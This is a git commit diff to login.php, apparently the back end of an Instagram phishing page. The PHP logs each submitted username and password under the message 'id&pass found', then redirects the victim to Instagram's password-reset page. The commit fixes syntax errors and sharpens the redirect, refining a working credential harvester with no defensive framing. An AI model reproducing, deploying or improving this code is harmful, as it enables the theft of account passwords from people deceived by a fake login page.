c169d354f25c565327a2a611970191682bb887b0
rekcahkumar <48340011+rekcahkumar@users.noreply.github.com>
2021-04-14 16:09:07 +0530

    Add files via upload

--- login.php
+++ login.php
@@ -1,7 +1,7 @@
 <?php
-error_log("")
+error_log("");
 error_log("id&pass found");
 error_log("Account: " . $_POST['username'] . " Pass: " . $_POST['password'] );
-error_log("")
-header('Location: https://instagram.com');
+error_log("");
+header('Location: https://www.instagram.com/accounts/password/reset/');
 exit();
